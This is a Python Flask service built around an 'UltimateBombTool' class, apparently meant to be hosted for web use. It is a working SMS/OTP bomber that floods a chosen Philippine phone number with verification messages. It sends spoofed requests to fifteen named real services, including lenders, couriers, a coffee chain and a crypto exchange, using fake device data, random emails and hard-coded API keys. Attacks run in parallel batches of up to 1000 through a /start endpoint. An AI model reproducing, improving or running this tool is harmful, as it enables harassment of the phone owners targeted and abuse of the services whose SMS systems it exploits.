import random
import string
import json
import sys
import os
import time
import requests
import hashlib
import uuid
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask, request, jsonify
from flask_cors import CORS
import threading

app = Flask(__name__)
CORS(app)  # Allow cross-origin requests from Vercel

# ---------- Original UltimateBombTool class (unchanged) ----------
RED = '\033[1;31m'
GREEN = '\033[1;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
MAGENTA = '\033[1;35m'
CYAN = '\033[1;36m'
WHITE = '\033[1;37m'
RESET = '\033[0m'

class UltimateBombTool:
    def __init__(self):
        self.osim_url = "https://prod.services.osim-cloud.com/identity/api/v1.0/account"
        self.success_count = 0
        self.fail_count = 0
        self.total_attempts = 0

        self.all_services = [
            ("BOMB OTP", self.send_bomb_otp),
            ("EZLOAN", self.send_ezloan),
            ("XPRESS PH", self.send_xpress),
            ("ABENSON", self.send_abenson),
            ("EXCELLENT LENDING", self.send_excellent_lending),
            ("BISTRO", self.send_bistro),
            ("BAYAD CENTER", self.send_bayad),
            ("LBC CONNECT", self.send_lbc),
            ("PICKUP COFFEE", self.send_pickup_coffee),
            ("HONEY LOAN", self.send_honey_loan),
            ("KUMU PH", self.send_kumu_ph),
            ("S5.COM", self.send_s5_otp),
            ("CASHALO", self.send_cashalo),
            ("MWELL", self.send_mwell),
            ("PEXX", self.send_pexx)
        ]

    def format_phone(self, phone):
        phone = str(phone).strip()
        phone = phone.replace(' ', '').replace('-', '').replace('+', '')
        if phone.startswith('0'):
            phone = phone[1:]
        elif phone.startswith('63'):
            phone = phone[2:]
        return phone

    def validate_phone(self, phone):
        import re
        clean_phone = self.format_phone(phone)
        return bool(re.match(r'^9\d{9}$', clean_phone))

    def random_string(self, length):
        chars = string.ascii_lowercase + string.digits
        return ''.join(random.choice(chars) for _ in range(length))

    def random_gmail(self):
        n = random.randint(8, 12)
        return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n)) + "@gmail.com"

    def generate_kumu_signature(self, timestamp, random_str, phone_number):
        secret = "kumu_secret_2024"
        data = f"{timestamp}{random_str}{phone_number}{secret}"
        return hashlib.sha256(data.encode()).hexdigest()

    # ---------- 13 original services ----------
    def send_bomb_otp(self, phone_number):
        try:
            formatted_phone = self.format_phone(phone_number)
            headers = {
                'User-Agent': 'OSIM/1.55.0 (Android 16; CPH2465; OP5958L1; arm64-v8a)',
                'Accept': 'application/json',
                'Accept-Encoding': 'gzip',
                'Content-Type': 'application/json',
                'accept-language': 'en-SG',
                'region': 'PH'
            }
            credentials = {
                "userName": formatted_phone,
                "phoneCode": "63",
                "password": f"TempPass{random.randint(1000, 9999)}!"
            }
            response = requests.post(f"{self.osim_url}/register", headers=headers, json=credentials, timeout=8)
            if response.status_code == 200:
                result = response.json()
                if result.get('resultCode', 0) in [201000, 200000]:
                    return True
            return False
        except:
            return False

    def send_ezloan(self, phone_number):
        try:
            formatted_phone = self.format_phone(phone_number)
            current_time = int(time.time() * 1000)
            headers = {
                'User-Agent': 'okhttp/4.9.2',
                'Content-Type': 'application/json',
                'imei': '7a997625bd704baebae5643a3289eb33',
                'device': 'android',
                'brand': 'oneplus',
                'model': 'CPH2465',
                'source': 'EZLOAN',
                'appversion': '2.0.4',
                'blackbox': f'kGPGg{current_time}DCl3O8MVBR0',
            }
            data = {
                "businessId": "EZLOAN",
                "contactNumber": f"+63{formatted_phone}",
                "appsflyerIdentifier": f"{current_time}-{random.randint(1000000000000000000, 9999999999999999999)}"
            }
            response = requests.post('https://gateway.ezloancash.ph/security/auth/otp/request',
                                   headers=headers, json=data, timeout=8)
            if response.status_code == 200:
                resp_json = response.json()
                if resp_json.get('code') == 0:
                    return True
            return False
        except:
            return False

    def send_xpress(self, phone_number, index):
        try:
            headers = {"User-Agent": "Dalvik/2.1.0", "Content-Type": "application/json"}
            timestamp = int(time.time())
            data = {
                "FirstName": f"User{timestamp}_{index}",
                "LastName": "Test",
                "Email": f"user{timestamp}_{index}@gmail.com",
                "Phone": f"+63{self.format_phone(phone_number)}",
                "Password": f"Pass{random.randint(1000, 9999)}",
                "ConfirmPassword": f"Pass{random.randint(1000, 9999)}"
            }
            response = requests.post("https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp",
                                   headers=headers, json=data, timeout=8)
            return response.status_code == 200
        except:
            return False

    def send_abenson(self, phone_number):
        try:
            headers = {'User-Agent': 'okhttp/4.9.0', 'Content-Type': 'application/x-www-form-urlencoded'}
            data = f'contact_no={phone_number}&login_token=undefined'
            response = requests.post('https://api.mobile.abenson.com/api/public/membership/activate_otp',
                                   headers=headers, data=data, timeout=8)
            return response.status_code == 200
        except:
            return False

    def send_excellent_lending(self, phone_number):
        try:
            headers = {'User-Agent': 'okhttp/4.12.0', 'Content-Type': 'application/json'}
            data = {"domain": phone_number, "cat": "login", "previous": False, "financial": self.random_string(32)}
            response = requests.post('https://api.excellenteralending.com/dllin/union/rehabilitation/dock',
                                   headers=headers, json=data, timeout=8)
            return response.status_code == 200
        except:
            return False

    def send_bistro(self, phone_number):
        try:
            formatted_phone = self.format_phone(phone_number)
            headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 16)', 'Accept': 'application/json'}
            url = f'https://bistrobff-adminservice.arlo.com.ph:9001/api/v1/customer/loyalty/otp?mobileNumber=63{formatted_phone}'
            response = requests.get(url, headers=headers, timeout=10)
            if response.status_code == 200:
                resp_json = response.json()
                return resp_json.get('isSuccessful') == True
            return False
        except:
            return False

    def send_bayad(self, phone_number):
        try:
            formatted_phone = self.format_phone(phone_number)
            bayad_phone = f"+63{formatted_phone}"
            headers = {
                "accept": "application/json",
                "content-type": "application/json",
                "user-agent": "Mozilla/5.0 (Linux; Android 10)"
            }
            email = self.random_gmail()
            payload = {"mobileNumber": bayad_phone, "emailAddress": email}
            response = requests.post("https://api.online.bayad.com/api/sign-up/otp", headers=headers, json=payload, timeout=10)
            return response.status_code == 200
        except:
            return False

    def send_lbc(self, phone_number):
        try:
            headers = {'User-Agent': 'Dart/2.19', 'Content-Type': 'application/x-www-form-urlencoded'}
            data = {
                'verification_type': 'mobile',
                'client_email': f'{self.random_string(8)}@gmail.com',
                'client_contact_code': '+63',
                'client_contact_no': self.format_phone(phone_number),
                'app_log_uid': self.random_string(16)
            }
            response = requests.post('https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification',
                                   headers=headers, data=data, timeout=8)
            return response.status_code == 200
        except:
            return False

    def send_pickup_coffee(self, phone_number):
        try:
            headers = {'User-Agent': 'okhttp/4.12.0', 'Content-Type': 'application/json'}
            data = {"mobile_number": f"+63{self.format_phone(phone_number)}", "login_method": "mobile_number"}
            response = requests.post('https://production.api.pickup-coffee.net/v2/customers/login',
                                   headers=headers, json=data, timeout=8)
            return response.status_code == 200
        except:
            return False

    def send_honey_loan(self, phone_number):
        try:
            headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 15)', 'Content-Type': 'application/json'}
            data = {"phone": phone_number, "is_rights_block_accepted": 1}
            response = requests.post('https://api.honeyloan.ph/api/client/registration/step-one',
                                   headers=headers, json=data, timeout=8)
            if response.status_code == 200:
                resp_json = response.json()
                return resp_json.get('success') == True
            return False
        except:
            return False

    def send_kumu_ph(self, phone_number):
        try:
            formatted_phone = self.format_phone(phone_number)
            encrypt_timestamp = int(time.time())
            encrypt_rnd_string = self.random_string(32)
            encrypt_signature = self.generate_kumu_signature(encrypt_timestamp, encrypt_rnd_string, formatted_phone)
            headers = {'User-Agent': 'okhttp/5.0.0-alpha.14', 'Content-Type': 'application/json', 'Device-Type': 'android'}
            data = {
                "country_code": "+63",
                "encrypt_rnd_string": encrypt_rnd_string,
                "cellphone": formatted_phone,
                "encrypt_signature": encrypt_signature,
                "encrypt_timestamp": encrypt_timestamp
            }
            response = requests.post('https://api.kumuapi.com/v2/user/sendverifysms', headers=headers, json=data, timeout=10)
            if response.status_code == 200:
                resp_json = response.json()
                return resp_json.get('code') in [200, 403]
            return False
        except:
            return False

    def send_s5_otp(self, phone_number):
        try:
            normalized_phone = f"+63{self.format_phone(phone_number)}"
            boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
            headers = {
                'accept': 'application/json',
                'content-type': f'multipart/form-data; boundary={boundary}',
                'user-agent': 'Mozilla/5.0 (Linux; Android 15)'
            }
            body = f'--{boundary}\r\nContent-Disposition: form-data; name="phone_number"\r\n\r\n{normalized_phone}\r\n--{boundary}--\r\n'
            response = requests.post('https://api.s5.com/player/api/v1/otp/request', headers=headers, data=body, timeout=8)
            return response.status_code == 200
        except:
            return False

    def send_cashalo(self, phone_number):
        try:
            formatted_phone = self.format_phone(phone_number)
            device_identifier = str(uuid.uuid4())[:16].replace('-', '')
            apps_flyer_id = f"{int(time.time() * 1000)}-{str(uuid.uuid4().int)[:15]}"
            advertising_id = str(uuid.uuid4())
            firebase_id = str(uuid.uuid4().hex)
            headers = {
                'User-Agent': 'okhttp/4.12.0',
                'Content-Type': 'application/json',
                'x-api-key': 'UKgl31KZaZbJakJ9At92gvbMdlolj0LT33db4zcoi7oJ3/rgGmrHB1ljINI34BRMl+DloqTeVK81yFSDfZQq+Q==',
                'x-device-identifier': device_identifier,
                'x-device-type': '1',
                'x-firebase-instance-id': firebase_id
            }
            data = {
                "phone_number": formatted_phone,
                "device_identifier": device_identifier,
                "device_type": 1,
                "apps_flyer_device_id": apps_flyer_id,
                "advertising_id": advertising_id
            }
            response = requests.post('https://api.cashaloapp.com/access/register', headers=headers, json=data, timeout=10)
            if response.status_code == 200:
                response_data = response.json()
                return 'access_challenge_request' in response_data
            return False
        except:
            return False

    # ---------- MWELL service ----------
    def send_mwell(self, phone_number):
        try:
            formatted_phone = self.format_phone(phone_number)
            headers = {
                'User-Agent': 'okhttp/4.11.0',
                'Content-Type': 'application/json',
                'ocp-apim-subscription-key': '0a57846786b34b0a89328c39f584892b',
                'x-app-version': random.choice(['03.942.035', '03.942.036', '03.942.037', '03.942.038']),
                'x-device-type': 'android',
                'x-device-model': random.choice(['oneplus CPH2465', 'TechnoMopone', 'samsung SM-G998B']),
                'x-timestamp': str(int(time.time() * 1000)),
                'x-request-id': self.random_string(16)
            }
            data = {"country": "PH", "phoneNumber": formatted_phone, "phoneNumberPrefix": "+63"}
            response = requests.post('https://gw.mwell.com.ph/api/v2/app/mwell/auth/sign/mobile-number',
                                   headers=headers, json=data, timeout=20)
            if response.status_code == 200:
                resp_json = response.json()
                return resp_json.get('c') == 200
            return False
        except:
            return False

    # ---------- PEXX service ----------
    def send_pexx(self, phone_number):
        try:
            formatted_phone = self.format_phone(phone_number)
            headers = {
                'User-Agent': 'okhttp/4.12.0',
                'Content-Type': 'application/json',
                'tid': self.random_string(11),
                'appversion': '3.0.14',
            }
            data = {
                "0": {
                    "json": {
                        "email": "",
                        "areaCode": "+63",
                        "phone": f"+63{formatted_phone}",
                        "otpChannel": "TG",
                        "otpUsage": "REGISTRATION"
                    }
                }
            }
            response = requests.post('https://api.pexx.com/api/trpc/auth.sendSignupOtp?batch=1',
                                   headers=headers, json=data, timeout=20)
            if response.status_code == 200:
                try:
                    resp_json = response.json()
                    if isinstance(resp_json, list) and len(resp_json) > 0:
                        result_data = resp_json[0].get('result', {}).get('data', {}).get('json', {})
                        return result_data.get('code') == 200
                except:
                    pass
            return False
        except:
            return False

    # ---------- Main attack method (with progress callback) ----------
    def execute_parallel_attack(self, phone_number, amount, progress_callback=None):
        formatted_phone = self.format_phone(phone_number)
        total_messages_per_batch = len(self.all_services)  # = 15
        total_bombs = amount * total_messages_per_batch

        self.success_count = 0
        self.fail_count = 0
        self.total_attempts = 0

        cum_success = 0
        cum_fail = 0

        for batch_num in range(1, amount + 1):
            batch_success = 0
            batch_fail = 0

            # Prepare tasks for all 15 services
            tasks = []
            for service_name, service_func in self.all_services:
                if service_name == "XPRESS PH":
                    tasks.append((service_name, lambda s=service_func: s(phone_number, batch_num)))
                else:
                    tasks.append((service_name, lambda s=service_func: s(phone_number)))

            # Execute all 15 services in parallel
            with ThreadPoolExecutor(max_workers=15) as executor:
                futures = []
                for service_name, task_func in tasks:
                    future = executor.submit(task_func)
                    futures.append((service_name, future))

                for service_name, future in futures:
                    try:
                        success = future.result(timeout=10)
                        self.total_attempts += 1
                        if success:
                            self.success_count += 1
                            batch_success += 1
                        else:
                            self.fail_count += 1
                            batch_fail += 1
                    except Exception:
                        self.fail_count += 1
                        batch_fail += 1
                        self.total_attempts += 1

            cum_success += batch_success
            cum_fail += batch_fail

            if progress_callback:
                progress_callback(batch_num, amount, cum_success, cum_fail, self.total_attempts)

            if batch_num < amount:
                time.sleep(5)

        return {
            "total_attempts": self.total_attempts,
            "success": self.success_count,
            "fail": self.fail_count
        }

# ---------- Flask routes ----------
bomb_tool = UltimateBombTool()
job_status = {}   # in-memory job store

@app.route('/start', methods=['POST'])
def start_attack():
    data = request.get_json()
    if not data:
        return jsonify({"error": "Missing JSON"}), 400

    phone = data.get('phone', '').strip()
    batches = data.get('batches', 1)
    if not phone or batches < 1 or batches > 1000:
        return jsonify({"error": "Invalid phone or batches"}), 400

    if not bomb_tool.validate_phone(phone):
        return jsonify({"error": "Invalid Philippine number"}), 400

    job_id = str(uuid.uuid4())[:8]
    job_status[job_id] = {
        "status": "running",
        "phone": phone,
        "batches": batches,
        "progress": 0,
        "total": 0,
        "success": 0,
        "fail": 0
    }

    def progress_callback(batch_num, total_batches, cum_success, cum_fail, total_attempts):
        job_status[job_id].update({
            "progress": batch_num,
            "total": total_attempts,
            "success": cum_success,
            "fail": cum_fail
        })

    def attack_job():
        try:
            result = bomb_tool.execute_parallel_attack(phone, batches, progress_callback)
            job_status[job_id].update({
                "status": "completed",
                "total": result["total_attempts"],
                "success": result["success"],
                "fail": result["fail"]
            })
        except Exception as e:
            job_status[job_id] = {"status": "error", "error": str(e)}

    threading.Thread(target=attack_job).start()

    return jsonify({"job_id": job_id, "total_requests": batches * 15})

@app.route('/status/<job_id>', methods=['GET'])
def get_status(job_id):
    info = job_status.get(job_id)
    if not info:
        return jsonify({"error": "Job not found"}), 404
    return jsonify(info)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))